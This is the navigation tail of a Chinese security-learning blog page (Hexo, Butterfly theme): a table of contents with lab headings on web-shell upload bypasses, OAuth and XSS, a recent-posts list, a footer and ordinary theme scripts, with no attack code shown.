class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AA%8C%E8%AF%81"><span class="toc-number">10.3.</span> <span class="toc-text">利用有缺陷的文件上传验证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E9%AA%8C%E8%AF%81"><span class="toc-number">10.3.1.</span> <span class="toc-text">有缺陷的文件类型验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-Webshell-%E9%80%9A%E8%BF%87%E5%86%85%E5%AE%B9%E7%B1%BB%E5%9E%8B%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0"><span class="toc-number">10.3.1.1.</span> <span class="toc-text">LAB: Webshell 通过内容类型限制绕过上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E5%9C%A8%E7%94%A8%E6%88%B7%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">10.3.2.</span> <span class="toc-text">防止在用户可访问的目录中执行文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E9%80%9A%E8%BF%87%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E4%B8%8A%E4%BC%A0-Web-shell"><span class="toc-number">10.3.2.1.</span> <span class="toc-text">LAB: 通过路径遍历上传 Web shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8D%E8%B6%B3"><span class="toc-number">10.4.</span> <span class="toc-text">危险文件类型的黑名单不足</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="toc-number">10.4.1.</span> <span class="toc-text">覆盖服务器配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-Web-shell-%E9%80%9A%E8%BF%87%E6%89%A9%E5%B1%95%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0"><span class="toc-number">10.4.1.1.</span> <span class="toc-text">LAB:Web shell 通过扩展黑名单绕过上传</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B7%E6%B7%86%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D"><span class="toc-number">10.4.2.</span> <span class="toc-text">混淆文件扩展名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E9%80%9A%E8%BF%87%E6%B7%B7%E6%B7%86%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell"><span class="toc-number">10.4.2.1.</span> <span class="toc-text">LAB: 通过混淆文件扩展名上传webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E9%AA%8C%E8%AF%81%E6%9C%89%E7%BC%BA%E9%99%B7"><span class="toc-number">10.4.3.</span> <span class="toc-text">文件内容验证有缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LAB-%E9%80%9A%E8%BF%87%E5%A4%9A%E8%AF%AD%E8%A8%80webshell%E4%B8%8A%E4%BC%A0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">10.4.3.1.</span> <span class="toc-text">LAB: 通过多语言webshell上传远程代码执行</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OAuth2-0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">OAuth2.0身份验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%870Auth%E9%9A%90%E5%BC%8F%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">11.0.1.</span> <span class="toc-text">1.通过0Auth隐式流程绕过身份验证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-Cross-site-scripting"><span class="toc-number">12.</span> <span class="toc-text">XSS[Cross-site scripting]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E6%9C%80%E6%B5%81%E8%A1%8C%E3%80%81%E6%9C%80%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">12.1.</span> <span class="toc-text">三种最流行、最强大的利用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96cookie"><span class="toc-number">12.1.1.</span> <span class="toc-text">窃取cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%87%AA%E5%8A%A8%E5%A1%AB%E5%85%85%E5%AF%86%E7%A0%81"><span class="toc-number">12.1.2.</span> <span class="toc-text">获取自动填充密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CCSRF"><span class="toc-number">12.1.3.</span> <span class="toc-text">执行CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">12.1.4.</span> <span class="toc-text">1.反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">12.1.5.</span> <span class="toc-text">2.存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B%E5%92%8C%E5%AD%98%E5%82%A8%E5%9E%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">12.1.6.</span> <span class="toc-text">反射型和存储型的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%9F%BA%E4%BA%8EDOM%E5%9E%8BXSS-location-search-gt-document-write"><span class="toc-number">12.1.7.</span> <span class="toc-text">3.基于DOM型XSS: location.search-&gt;document.write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%9F%BA%E4%BA%8EDOM%E5%9E%8BXSS-location-search-gt-innerHTML"><span class="toc-number">12.1.8.</span> <span class="toc-text">4.基于DOM型XSS: location.search-&gt;innerHTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><span class="toc-number">12.1.9.</span> <span class="toc-text">5.DOM XSS in jQuery anchor href attribute sink using location.search source</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">12.1.9.1.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/" title="Burpsuite靶场-服务端"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burpsuite靶场-服务端"/></a><div class="content"><a class="title" href="/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/" title="Burpsuite靶场-服务端">Burpsuite靶场-服务端</a><time datetime="2023-02-18T14:33:44.000Z" title="Created 2023-02-18 22:33:44">2023-02-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/selenium%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" title="selenium自动化"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/a93bec374a704e27ba9dd76c8c0961c3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="selenium自动化"/></a><div class="content"><a class="title" href="/2023/01/31/selenium%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" title="selenium自动化">selenium自动化</a><time datetime="2023-01-31T05:02:14.000Z" title="Created 2023-01-31 13:02:14">2023-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/Linux%E4%B8%89%E5%89%91%E5%AE%A2/" title="Linux三剑客"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/d028a08b2fbe4a9a9de73428fab8e468.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux三剑客"/></a><div class="content"><a class="title" href="/2022/11/02/Linux%E4%B8%89%E5%89%91%E5%AE%A2/" title="Linux三剑客">Linux三剑客</a><time datetime="2022-11-02T12:04:48.312Z" title="Created 2022-11-02 20:04:48">2022-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/24/LNMP%E5%8E%9F%E7%94%9F%E6%90%AD%E5%BB%BA/" title="LNMP原生搭建Web服务器"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/4f280930a7c9471383407a70fcd01ebb.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LNMP原生搭建Web服务器"/></a><div class="content"><a class="title" href="/2022/10/24/LNMP%E5%8E%9F%E7%94%9F%E6%90%AD%E5%BB%BA/" title="LNMP原生搭建Web服务器">LNMP原生搭建Web服务器</a><time datetime="2022-10-24T10:15:08.491Z" title="Created 2022-10-24 18:15:08">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/24/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80/" title="数字取证基础"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/e80b051fd4b34688b8324dad38c92ac1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数字取证基础"/></a><div class="content"><a class="title" href="/2022/10/24/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80/" title="数字取证基础">数字取证基础</a><time datetime="2022-10-24T01:07:22.000Z" title="Created 2022-10-24 09:07:22">2022-10-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By css_0k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>